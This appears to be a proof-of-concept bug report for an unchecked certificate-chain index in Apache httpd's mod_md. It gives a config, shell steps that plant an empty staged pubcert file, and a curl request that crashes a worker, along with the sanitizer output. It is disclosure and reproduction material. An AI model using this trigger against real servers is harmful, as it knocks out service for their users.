# PoC 201 - Unchecked Certificate Chain Index

`get_staging_certs_json()` reads `APR_ARRAY_IDX(chain, 0, ...)` immediately
after `md_pubcert_load()` succeeds, with no `nelts > 0` guard, so an empty
staged `pubcert*.pem` returns an uninitialised array slot.

## Setup

httpd with `mod_md` enabled and a managed domain whose staging area contains
an empty pubcert chain. Build with `-fsanitize=address` and
`detect_uninitialized_reads=1` (or use MSan) to catch the read.

`/tmp/httpd.conf`:

```apache
ServerName 127.0.0.1
Listen 127.0.0.1:8080
LoadModule mpm_event_module    modules/mod_mpm_event.so
LoadModule unixd_module        modules/mod_unixd.so
LoadModule authz_core_module   modules/mod_authz_core.so
LoadModule watchdog_module     modules/mod_watchdog.so
LoadModule md_module           modules/mod_md.so
LoadModule ssl_module          modules/mod_ssl.so
LoadModule status_module       modules/mod_status.so

ServerAdmin admin@example.test
MDStoreDir /tmp/md-store

MDomain example.test
MDCertificateAuthority https://localhost:14000/dir
MDDriveMode manual

<Location "/server-status">
    SetHandler server-status
    Require all granted
</Location>
<Location "/.httpd/certificate-status">
    Require all granted
</Location>
```

Construct a staging area with an empty chain for `example.test`:

```sh
mkdir -p /tmp/md-store/staging/example.test
# Minimal job.json so status_get_md_json() considers the staging slot.
printf '{"name":"example.test","finished":false}' \
    > /tmp/md-store/staging/example.test/job.json
# A zero-byte pubcert file makes md_pubcert_load() return APR_SUCCESS
# with an empty chain (nelts == 0).
: > /tmp/md-store/staging/example.test/pubcert.pem
# Matching md.json describing one key spec.
cat > /tmp/md-store/staging/example.test/md.json <<'EOF'
{ "name":"example.test", "domains":["example.test"],
  "ca": {"url":"https://localhost:14000/dir"},
  "pkeys":[{"type":"RSA","bits":2048}] }
EOF
```

## Trigger

```sh
httpd -DFOREGROUND -f /tmp/httpd.conf &
curl -s http://127.0.0.1:8080/.httpd/certificate-status?domain=example.test
```

The status handler invokes `md_status_get_md_json()` ->
`status_get_md_json()` -> `get_staging_certs_json()` at
`modules/md/md_status.c:206`.

## Observed effect

- ASan/MSan report:

  ```
  ==pid==ERROR: ... use-of-uninitialized-value
      #0 get_staging_certs_json md_status.c:206
      #1 status_get_md_json
      #2 md_status_get_md_json
  ```

  The uninitialised pointer is then forwarded into `status_get_certs_json()`
  and dereferenced through certificate helper functions, producing a SIGSEGV
  in non-instrumented builds.
- Log marker: `child pid ... exit signal Segmentation fault (11)` correlated
  with a request to `/.httpd/certificate-status`.
- The same crash is reachable without ACME interaction by hand-crafting the
  staging directory, as shown above.
